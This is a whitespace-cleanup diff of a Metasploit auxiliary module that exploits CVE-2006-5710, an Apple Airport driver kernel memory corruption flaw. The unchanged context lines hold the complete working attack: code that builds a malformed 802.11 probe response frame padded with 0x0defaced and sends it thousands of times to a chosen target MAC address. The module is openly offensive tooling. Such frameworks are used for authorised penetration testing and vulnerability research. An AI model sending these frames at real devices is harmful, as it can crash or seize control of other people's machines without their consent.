@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -19,21 +19,21 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Auxiliary::Dos
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Apple Airport 802.11 Probe Response Kernel Memory Corruption',
 			'Description'    => %q{
 				The Apple Airport driver provided with Orinoco-based Airport cards (1999-2003 PowerBooks, iMacs)
-				is vulnerable to a remote memory corruption flaw. When the driver is placed into active scanning 
+				is vulnerable to a remote memory corruption flaw. When the driver is placed into active scanning
 				mode, a malformed probe response frame can be used to corrupt internal kernel structures, leading
 				to arbitrary code execution. This vulnerability is triggered when a probe response frame is received
-				that does not contain valid information element (IE) fields after the fixed-length header. The data 
-				following the fixed-length header is copied over internal kernel structures, resulting in memory 
+				that does not contain valid information element (IE) fields after the fixed-length header. The data
+				following the fixed-length header is copied over internal kernel structures, resulting in memory
 				operations being performed on attacker-controlled pointer values.
 			},
-			
+
 			'Author'         => [ 'hdm' ],
 			'License'        => MSF_LICENSE,
-			'References'	 => 
+			'References'	 =>
 				[
 					['CVE', '2006-5710'],
 					['OSVDB', '30180'],
@@ -44,7 +44,7 @@ class Metasploit3 < Msf::Auxiliary
 			[
 				OptInt.new('COUNT', [ true, "The number of frames to send", 2000]),
 				OptString.new('ADDR_DST', [ true,  "The MAC address of the target system"])
-			], self.class)					
+			], self.class)
 	end
 
 	#
@@ -54,38 +54,38 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run
 		open_wifi
-		
+
 		cnt = datastore['COUNT'].to_i
 
-		print_status("Creating malicious probe response frame...")		
+		print_status("Creating malicious probe response frame...")
 		frame = create_frame()
-		
+
 		print_status("Sending #{cnt} frames...")
 		cnt.times { wifi.write(frame) }
 	end
-	
+
 	def create_frame
 		bssid    = Rex::Text.rand_text(6)
 		seq      = [rand(255)].pack('n')
 		caps     = [rand(65535)].pack('n')
-		
-		frame = 
+
+		frame =
 			"\x50" +                      # type/subtype
 			"\x00" +                      # flags
-			"\x00\x00" +                  # duration  
+			"\x00\x00" +                  # duration
 			eton(datastore['ADDR_DST']) + # dst
 			bssid +                       # src
 			bssid +                       # bssid
-			seq   +                       # seq  
+			seq   +                       # seq
 			Rex::Text.rand_text(8) +      # timestamp value
 			Rex::Text.rand_text(2) +      # beacon interval
 			Rex::Text.rand_text(2)        # capabilities
-		
+
 		frame << [0x0defaced].pack('N') * ((1024-frame.length) / 4)
-		
+
 		return frame
 
-	end	
+	end
 end
 
 =begin
